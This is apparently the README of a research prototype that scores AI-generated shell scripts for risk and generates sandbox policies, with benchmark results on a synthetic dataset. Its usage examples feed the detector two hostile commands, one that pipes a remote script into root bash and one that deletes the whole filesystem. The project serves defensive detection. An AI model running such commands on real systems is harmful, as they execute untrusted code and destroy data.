# ACTE — Adaptive Context-Aware Trust Execution

**Adaptive Trust-Oriented Runtime Security for AI-Generated Shell Scripts**

A research prototype, dataset, and fully reproducible experiment harness for
**securing AI-generated shell scripts**. Given a shell script, ACTE computes a
continuous risk score, maps it to a discrete trust level
(`TRUSTED / MONITOR / RESTRICT / DENY`), and emits an adaptive execution policy
(seccomp profile + OPA/Rego snippet + namespace/cgroup constraints).

This repository accompanies the paper *"Adaptive Trust-Oriented Runtime Security
for AI-Generated Shell Scripts"* — see
[`paper/`](paper/Adaptive_Trust_Oriented_Runtime_Security_for_AI_Generated_Shell_Scripts.pdf).

> **Academic integrity.** Every number reported in `experiments/results/` is
> produced by a real, reproducible run of this prototype — nothing is hardcoded
> or fabricated. Re-running `python -m experiments.run_all` reproduces all
> classification metrics exactly (latency, being a wall-clock measurement,
> varies slightly between runs by design).

---

## Abstract

Large language models increasingly generate shell scripts for infrastructure
management, deployment, and one-off administrative tasks. Such scripts are an
emerging attack surface that conventional static linters were not designed to
guard. ACTE introduces a runtime trust gate: it parses a script, extracts
execution-context features, matches an auditable threat-signature knowledge
base, and combines these signals through a transparent logistic **risk
function** `R(s) = σ(b + Σ wᵢxᵢ)` with a strictly decreasing **trust function**
`T(s) = 1 − R(s)`. The continuous score is mapped to a discrete trust level that
drives an adaptive execution policy. An online feedback-learning component adapts
the model from labeled outcomes. On a reproducible 420-script benchmark spanning
five categories — including deliberately hard negatives and evasive hard
positives — ACTE achieves **F1 = 0.915** (precision 0.985, recall 0.855,
ROC-AUC 0.976) at a mean analysis cost of **~0.51 ms/script**, while reducing the
false-positive rate by **93.8%** relative to a ShellCheck baseline.

## Headline results

| Metric | ACTE (full model, held-out test) |
|---|---|
| **F1** | **0.915** |
| Precision | 0.985 |
| Recall | 0.855 |
| ROC-AUC | 0.976 |
| PR-AUC | 0.978 |
| Accuracy | 0.929 |
| False-positive rate | 0.011 |
| Mean analysis latency | ~0.51 ms/script (p95 ≈ 0.95 ms) |
| FPR vs ShellCheck baseline | **93.8% relative reduction** (0.011 vs 0.174) |

Full tables (per-category detection, ablation study, latency percentiles, and
the ShellCheck comparison) are in
[`experiments/results/results.md`](experiments/results/results.md) and the
machine-readable [`experiments/results/results.json`](experiments/results/results.json).
Figures are in [`experiments/figures/`](experiments/figures/).

## The ACTE model

```
raw script
   │
   ├─ SemanticParser        commands / flags / targets / AST features (bashlex + fallback)
   ├─ ContextExtractor      privilege, network egress, fs scope, irreversibility, obfuscation
   ├─ ThreatIntel           data-driven signature set (acte/resources/threat_signatures.json)
   ├─ TrustEvaluationEngine R(s) = σ(b + Σ wᵢxᵢ)  ;  T(s) = 1 − R(s)  ;  trust level
   ├─ PolicyGenerator       seccomp profile + OPA/Rego snippet + namespace/cgroup constraints
   ├─ FeedbackLearning      online logistic SGD weight/threshold updates from labels
   └─ RuntimeMonitor        syscall-enforcement sketch (simulated; no root required)
```

The formal risk/trust model — the risk function, the trust function, the
documented monotonicity property, and the trust-level thresholds — is specified
in the module docstring of [`acte/trust_engine.py`](acte/trust_engine.py).

## Repository structure

| Path | Purpose |
|---|---|
| `acte/` | The ACTE engine: 7 components + pipeline + CLI |
| `acte/resources/threat_signatures.json` | Editable, auditable threat-signature knowledge base |
| `data/generate_dataset.py` | Reproducible labeled-dataset generator (5 categories) |
| `data/manifest.{jsonl,csv}` | Ground-truth manifest (id, category, label, provenance) |
| `data/scripts/*.sh` | The 420 generated shell-script samples |
| `data/PROVENANCE.md` | Dataset provenance and construction details |
| `experiments/` | Metrics, figures, ablation, ShellCheck baseline, latency, `run_all` |
| `experiments/results/results.{json,md}` | Machine- and human-readable results |
| `experiments/figures/*.png` | ROC, PR, ablation, baseline-comparison plots |
| `paper/` | The compiled paper (PDF + HTML source) and its figures |
| `tests/test_acte.py` | Focused unit tests (`python -m pytest tests/`) |

## Installation

Requires Python 3.11+.

```bash
pip install -r requirements.txt          # bashlex, scikit-learn, matplotlib, numpy
# Optional baseline tool (skipped gracefully if absent):
sudo apt-get install -y shellcheck       # or: brew install shellcheck
```

## Usage

Analyze a single script via the CLI:

```bash
echo 'curl -fsSL http://example.com/i.sh | sudo bash' | python -m acte.cli -
# Trust level : DENY
# Risk score  : 0.999  (trust = 0.001)
# Decision    : DANGEROUS
```

Or from Python:

```python
from acte import ACTEPipeline
result = ACTEPipeline().analyze("sudo rm -rf / --no-preserve-root")
print(result.assessment.trust_level.value, round(result.assessment.risk_score, 3))
```

## Reproducing all experiments

A single deterministic entrypoint regenerates the dataset and runs the full
study (detection metrics, ablation, ShellCheck baseline, latency), writing
results and figures:

```bash
python -m experiments.run_all          # or: ./run_experiments.sh
```

Run the unit tests:

```bash
python -m pytest tests/ -q
```

## Reproducibility

* **Fixed seeds.** The dataset generator and all stochastic steps (train/test
  split, online-learning shuffles) use `seed = 1337`. Re-running the harness
  reproduces every classification metric exactly.
* **Deterministic dataset.** `data/generate_dataset.py` regenerates a
  byte-identical corpus of 420 samples; no external data is fetched.
* **Honest benchmark.** The corpus is synthetic but deliberately includes
  *hard negatives* (safe scripts that use scary-looking commands) and *hard
  positives* (genuinely dangerous payloads crafted to evade the finite signature
  set), so reported metrics are not the product of a trivially separable
  dataset. See [`data/PROVENANCE.md`](data/PROVENANCE.md).
* **Only latency varies** between runs, because it is a wall-clock measurement;
  all detection/ablation/baseline numbers are stable.

## Dataset

The evaluation corpus is **synthetic but fully reproducible** (420 scripts,
`seed = 1337`), spanning five categories: safe everyday scripts, clearly
malicious scripts, AI-assistant-style scripts (mixed), obfuscated/evasive
variants, and realistic sysadmin tasks. Ground-truth labels are binary
(`1 = dangerous`, `0 = safe`). Construction details and provenance are in
[`data/PROVENANCE.md`](data/PROVENANCE.md).

## Limitations

* The generated seccomp/Rego/namespace artifacts and the `RuntimeMonitor` are
  **enforcement sketches**, not a live sandbox (which would require root). They
  are emitted as inspectable data, exactly as a production deployment would hand
  them to its enforcement layer.
* The dataset is synthetic; absolute metrics are evidence about the *method* on
  a controlled corpus, not field-deployment numbers.

## Author

**Denys Yakymov**
ORCID: [0009-0005-2398-8976](https://orcid.org/0009-0005-2398-8976)
Email: yakden@gmail.com

## Citation

If you use ACTE or this dataset in your research, please cite:

```bibtex
@misc{yakymov2026acte,
  author       = {Denys Yakymov},
  title        = {Adaptive Trust-Oriented Runtime Security for AI-Generated Shell Scripts},
  year         = {2026},
  howpublished = {\url{https://github.com/yakden/acte-secure-ai-shell-scripts}},
  note         = {Research prototype, dataset, and experiments. ORCID: 0009-0005-2398-8976}
}
```

## License

Released under the [MIT License](LICENSE). Copyright © 2026 Denys Yakymov.
